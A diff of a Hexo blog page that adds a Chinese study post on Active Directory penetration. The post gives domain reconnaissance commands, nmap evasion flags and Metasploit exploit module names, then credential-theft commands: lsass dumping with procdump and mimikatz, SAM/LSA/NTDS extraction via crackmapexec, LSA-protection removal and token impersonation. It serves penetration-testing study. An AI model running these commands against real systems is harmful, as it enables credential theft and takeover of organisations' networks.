@@ -8,7 +8,7 @@
     <meta http-equiv="Cache-Control" content="no-siteapp">
     <title>
         
-            Hexo
+            域渗透学习
         
     </title>
     <link rel="shortcut icon" href="#"/>
@@ -31,291 +31,138 @@
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body>
     <a id="cover"></a>
-    <link type="text/css" rel="stylesheet" href="/css/index.css">
-<div id="count"></div>
-<div id="header" >
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
     <div class="vertical">
         <div class="inner">
             
-                <h1 class="header-title">章鱼海绵</h1>
-                <h2 class="header-description" id="hitokoto"></h2>
-                <h3 class="header-info" id="hitokotoAuthor"></h3>
+                <h1 class="header-subtitle">域渗透学习</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2023-09-13
+                        </span>
+                        
+                            <span id="/2023/09/13/域渗透学习/" class="leancloud_visitors" data-flag-title="域渗透学习">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/09/13/域渗透学习/"></span>
+                        </span>  
+                    </p>
+                    
+                        
+                            <span class="category-color">内网</span>
+                        
+                    
+                    
+                        
+                            <span class="tag-color">内网</span>
+                        
+                    
+                </div>
             
         </div>
     </div>
-    
-        <a class="scroll-down" href="javascript:;" target="_self" data-offset="-45">
-            <i class="scroll-down-icon iconfont icon-return"></i>
-        </a>
     
 </div>
 <div id="container">
     
-        
-            <!-- 首页 -->
-            <div class="articles">
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h1 id="域渗透学习"><a href="#域渗透学习" class="headerlink" title="域渗透学习"></a>域渗透学习</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>一般打内网，有域是肯定要打域控的。没域的话，是工作组环境，就打内网的其他服务。<br>要打域控，首先得找到域控。<br>这里所谓的找到域控，主要是拿到三要素：<br>1、域控的机器的名字<br>2、域的名字<br>3、域控的机器对应的域内的 ip<br>有的时候不一定三要素都能俱全，需要通过横向慢慢的来摸</p>
+<p>net group “Domain Controllers” &#x2F;Domain #查找域控机器的名字</p>
+<p>通常情况，dns 服务器搭建在域控服务器上</p>
+<p>1、尝试找内网的 dns 服务器的 ip，也在 ipconfig &#x2F;all 里面</p>
+<p>nltest &#x2F;dsgetdc:域名称</p>
+<p>但是这种方法有时候在拿到 webshell 其实并不能用<br>在目标机器上，nltest.exe 这个文件是在 Windows&#x2F;System32 文件夹里面的</p>
+<p>面对这种情况，也并非没有办法<br>直接找到和系统版本相符的 nltest.exe，然后传一个上去试试</p>
+<p>ipconfig &#x2F;all &#x2F;&#x2F;可以查看域控名字 然后找到 dns 服务器 然后找到域控<br>net view &#x2F;domain:demo &#x2F;&#x2F;可以查看域内机器<br>net group “domain users” &#x2F;domain &#x2F;&#x2F;域内用户列表<br>net user &#x2F;domain &#x2F;&#x2F;短版域内用户列表，但是需要 rpc 开启<br>net group “domain admins” &#x2F;domain &#x2F;&#x2F;域内管理员用户列表</p>
+<h2 id="Nmap使用"><a href="#Nmap使用" class="headerlink" title="Nmap使用"></a>Nmap使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">-sS   SYN扫描,使用最频繁，安全，快</span><br><span class="line">-sn   //对目标进行ping检测，不进行端口扫描</span><br><span class="line">-sP   //仅仅对目标进行ping检测</span><br><span class="line">-Pn   //目标机禁用ping，绕过ping扫描</span><br><span class="line">-sU   //UDP扫描,慢,可得到有价值的服务器程序</span><br><span class="line">-sT   //TCP 链接扫描</span><br><span class="line">-sI  僵尸ip 目标ip  //使用僵尸机对目标机发送数据包</span><br><span class="line">-sA   //检测哪些端口被屏蔽</span><br><span class="line">--system-dns //扫描指定系统的dns服务器</span><br><span class="line"> –traceroute  //追踪每个路由节点。</span><br><span class="line"></span><br><span class="line">-A   //强力扫描，耗时长</span><br><span class="line">-D   &lt;假ip&gt; //发送参杂着假ip的数据包检测</span><br><span class="line">-f   //使用小数据包发送，避免被识别出</span><br><span class="line">-sV  //对端口上的服务程序版本进行扫描</span><br><span class="line">-sC  //使用脚本进行扫描，耗时长</span><br><span class="line">-O   //对目标主机的操作系统进行扫描</span><br><span class="line">--source-port &lt;portnumber&gt; //针对防火墙只允许的源端口</span><br><span class="line"></span><br><span class="line">-6    //对ipv6地址的主机进行扫描</span><br><span class="line">-T1~6  //设置扫描速度，一般T4足够</span><br><span class="line">-oX myscan.xml //对扫描结果另存在myscan.xml</span><br><span class="line"></span><br><span class="line">–data-length: &lt;length&gt; //改变发生数据包的默认的长度，避免被识别出来是nmap发送的。</span><br><span class="line"> -PE/PP/PM: 使用ICMP echo, timestamp, and netmask 请求包发现主机</span><br></pre></td></tr></table></figure>
+
+<p>无凭证常用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP ip   #ping扫描</span><br><span class="line">nmap -Pn -sV --top-ports 50 --open ip  #快速扫描 禁用ping，扫描端口服务程序版本，扫描top50端口</span><br><span class="line">nmap -Pn -sC smb-vuln* -p 139，445 ip  #检测smb服务 禁用ping 使用脚本检测smb服务 139和445端口</span><br><span class="line">nmap -Pn -sC -sV ip #经典扫描</span><br><span class="line">nmap -Pn -sC -sV -p- ip #全扫描</span><br><span class="line">nmap -sU -sC -sV ip # UDP扫描</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞快速探测"><a href="#漏洞快速探测" class="headerlink" title="漏洞快速探测"></a>漏洞快速探测</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java rmi： exploit/multi/misc/java_rmi_server</span><br><span class="line">ms17-010：exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">tomcat：auxiliary/scanner/http/tomcat_enum</span><br><span class="line">jboss manager：exploit/multi/http/tomcat_mgr_deploy</span><br><span class="line">Java反序列化漏洞测试：ysoserial</span><br><span class="line">查找产品的CVE漏洞：searchsploit</span><br><span class="line">MS14-025： searchsploit</span><br><span class="line">findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</span><br><span class="line">爆破数据库连接：use admin/mssql/mssql_enum_sql_logins</span><br><span class="line">proxylogon：</span><br><span class="line">proxyshell：</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>接下来就是提权的操作，之前有一篇文章有些过，这里就不在写了</p>
+<h2 id="管理员权限之后"><a href="#管理员权限之后" class="headerlink" title="管理员权限之后"></a>管理员权限之后</h2><h3 id="获取密码-hsahdump"><a href="#获取密码-hsahdump" class="headerlink" title="获取密码 hsahdump"></a>获取密码 hsahdump</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/gentilkiwi/mimikatz/releases</span><br><span class="line">https://download.sysinternals.com/files/Procdump.zip</span><br><span class="line"></span><br><span class="line">可以帮他远程下载下来</span><br><span class="line">privilege::debug   提取权限</span><br><span class="line">sekurlsa::logonpasswords   抓取密码</span><br><span class="line"></span><br><span class="line">mimikatz是从 lsass.exe进程中获取windows的账号及密码的，</span><br><span class="line">这时，我们可以帮对方安装一个procdump64.exe（这是微软自己的工具，可以放心使用）</span><br><span class="line"></span><br><span class="line">然后从 lsass.exe进程里导出一个 包含账号密码信息的lsass.dmp 文件，再把这个dmp文件传回来，最后在自己的环境下运行mimikatz，从 dmp文件里读取信息。</span><br><span class="line"></span><br><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::minidump lsass.dmp&quot;</span><br><span class="line">&quot;sekurlsa::logonPasswords&quot; &quot;exit&quot;</span><br><span class="line">直接cs交互里面读就行</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line">&quot;lsadump::sam&quot; &quot;exit&quot;</span><br><span class="line">直接cs交互里面读就行</span><br><span class="line">hashdump: post/windows/gather/smart_hashdump</span><br><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -M lsassy</span><br><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &#x27;&lt;password&gt;&#x27; --sam / --lsa / --ntds</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过LSA防护策略读取密码"><a href="#绕过LSA防护策略读取密码" class="headerlink" title="绕过LSA防护策略读取密码"></a>绕过<strong>LSA防护策略</strong>读取密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PPLdump64.exe &lt;lsass.exe|lsass_pid&gt; lsass.dmp</span><br><span class="line">mimikatz &quot;!+&quot; &quot;!processprotect /process:lsass.exe /remove&quot; &quot;privilege::debug&quot;</span><br><span class="line">&quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;!processprotect</span><br><span class="line">/process:lsass.exe&quot; &quot;!-&quot; </span><br><span class="line">#with mimidriver.sys 得带上这个才行，看得带上这个才行</span><br></pre></td></tr></table></figure>
+
+<h3 id="token窃取"><a href="#token窃取" class="headerlink" title="token窃取"></a><strong>token</strong>窃取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.\incognito.exe list_tokens -u</span><br><span class="line">.\incognito.exe execute -c &quot;&lt;domain&gt;\&lt;user&gt;&quot; powershell.exe</span><br><span class="line">use incognito</span><br><span class="line">impersonate_token &lt;domain&gt;\\&lt;user&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="是否存在域"><a href="#是否存在域" class="headerlink" title="是否存在域"></a>是否存在域</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">systeminfo  </span><br><span class="line">ipconfig /all</span><br><span class="line"></span><br><span class="line">这个命令一般都能查看是否存在域</span><br><span class="line">同时还能看网卡的情况 看看网段</span><br><span class="line"></span><br><span class="line">net config workstation</span><br><span class="line">查看当前登录的域的环境</span><br></pre></td></tr></table></figure>
+
+<h3 id="寻找主域"><a href="#寻找主域" class="headerlink" title="寻找主域"></a>寻找主域</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">一般时间服务器 或者dns服务器都是在主域上</span><br><span class="line">你可以直接nslookup 或者 ping DNS服务器可能直接得到域控的ip</span><br><span class="line"></span><br><span class="line">net time /domain</span><br><span class="line">nltest /dsgetdc:域名称</span><br><span class="line">net group &quot;Domain Controllers&quot; /Domain </span><br><span class="line"></span><br><span class="line">两条命令能执行就直接定位，不行的话 没办法喽，换一台试试</span><br><span class="line"></span><br><span class="line">查看域控机器的机器名子</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="查找域内用户"><a href="#查找域内用户" class="headerlink" title="查找域内用户"></a>查找域内用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">查询域内所有用户组列表</span><br><span class="line">查看域内所有用户组</span><br><span class="line">net group /domain</span><br><span class="line">net group &quot;domain users&quot; /domain</span><br><span class="line">net user /domain //短版域内用户列表，但是需要 rpc 开启</span><br><span class="line">net group &quot;domain admins&quot; /domain //域内管理员用户列表</span><br><span class="line">net group &quot;domain computers&quot; /domain // 查看域中所有机器</span><br><span class="line"></span><br><span class="line">获取指定域用户的详细信息</span><br><span class="line">net user 用户名称 /domain</span><br><span class="line"></span><br><span class="line">查看域中的密码策略</span><br><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure>
+
+
                 
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/04/20/%E6%80%9D%E8%B7%AF/">渗透测试思路</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-04-20
-                            </span>
-                            
-                                <span id="/2023/04/20/思路/" class="leancloud_visitors" data-flag-title="渗透测试思路">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/04/20/思路/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/touxiang.jpg" alt="章鱼海绵">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>章鱼海绵
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/2023/09/13/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" target="_blank">域渗透学习</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                    <div class="category">
+                        分类：
+                        
+                            <a href="/categorie/%E5%86%85%E7%BD%91/">内网</a>
+                        
                     </div>
                 
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/04/13/windows%E6%8F%90%E6%9D%83%E8%87%AA%E6%88%91%E6%80%BB%E7%BB%93ing/">windows提权自我总结ing</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-04-13
-                            </span>
-                            
-                                <span id="/2023/04/13/windows提权自我总结ing/" class="leancloud_visitors" data-flag-title="windows提权自我总结ing">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/04/13/windows提权自我总结ing/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
+                
+                    <div class="tag">
+                        标签：
+                        
+                            <a href="/tag/%E5%86%85%E7%BD%91/">内网</a>
+                        
                     </div>
                 
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/04/05/CS%E5%81%9A%E6%88%90%E6%9C%8D%E5%8A%A1/">CS做成服务</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-04-05
-                            </span>
-                            
-                                <span id="/2023/04/05/CS做成服务/" class="leancloud_visitors" data-flag-title="CS做成服务">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/04/05/CS做成服务/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/04/05/APP%E6%B5%8B%E8%AF%95%E6%9C%8D%E5%8A%A1%E7%AB%AF/">APP测试服务端</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-04-05
-                            </span>
-                            
-                                <span id="/2023/04/05/APP测试服务端/" class="leancloud_visitors" data-flag-title="APP测试服务端">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/04/05/APP测试服务端/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/04/05/APP%E6%B5%8B%E8%AF%95%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%B9%E5%90%91/">APP测试客户端方向</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-04-05
-                            </span>
-                            
-                                <span id="/2023/04/05/APP测试客户端方向/" class="leancloud_visitors" data-flag-title="APP测试客户端方向">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/04/05/APP测试客户端方向/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/03/30/sql%E6%B3%A8%E5%85%A5%E6%9D%82%E8%AE%B0/">sql注入杂记</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-03-30
-                            </span>
-                            
-                                <span id="/2023/03/30/sql注入杂记/" class="leancloud_visitors" data-flag-title="sql注入杂记">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/03/30/sql注入杂记/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/03/28/csrf%E6%9D%82%E8%AE%B0/">csrf杂记</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-03-28
-                            </span>
-                            
-                                <span id="/2023/03/28/csrf杂记/" class="leancloud_visitors" data-flag-title="csrf杂记">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/03/28/csrf杂记/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/03/25/XSS%E6%9D%82%E8%AE%B0/">XSS杂记</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-03-25
-                            </span>
-                            
-                                <span id="/2023/03/25/XSS杂记/" class="leancloud_visitors" data-flag-title="XSS杂记">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/03/25/XSS杂记/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/03/16/windows%E6%8F%90%E6%9D%83/">windows提权（搬运来的）</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-03-16
-                            </span>
-                            
-                                <span id="/2023/03/16/windows提权/" class="leancloud_visitors" data-flag-title="windows提权（搬运来的）">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/03/16/windows提权/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/03/15/ciphey%E8%A7%A3%E7%A0%81/">ciphey解码</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-03-15
-                            </span>
-                            
-                                <span id="/2023/03/15/ciphey解码/" class="leancloud_visitors" data-flag-title="ciphey解码">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/03/15/ciphey解码/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
+                <div class="article-prev-next">
+                    
+                        <a href="/2023/09/14/%E5%AE%9E%E6%88%98%E4%B8%AD%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="prev-prefix">« </a> 上一篇：    <a href="/2023/09/14/%E5%AE%9E%E6%88%98%E4%B8%AD%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="发布于 2023-09-14 04:28">实战中代码审计</a>
+                        <br>
+                    
+                    
+                        <a href="/2023/08/16/%E5%A4%A7%E9%A9%AC%E5%AD%A6%E4%B9%A0/" class="next-prefix">» </a> 下一篇：    <a href="/2023/08/16/%E5%A4%A7%E9%A9%AC%E5%AD%A6%E4%B9%A0/" title="发布于 2023-08-16 10:29">大马学习</a>
+                    
+                </div>
             </div>
             
+    <div class="article-comments">
         
-    <div class="pagination-bottom">
-        <div class="pagination">
-            
-                <a class="extend prev" rel="prev" href="/">上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">下一页</a>
-            
-        </div>
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
     </div>
 
+        </div>
     
 </div>
     <div id="footer"></div>
@@ -341,7 +188,7 @@
             <div class="menu-list">
                 <ul>
                     
-                        <li class=" active "><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
                     
                         <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
                     
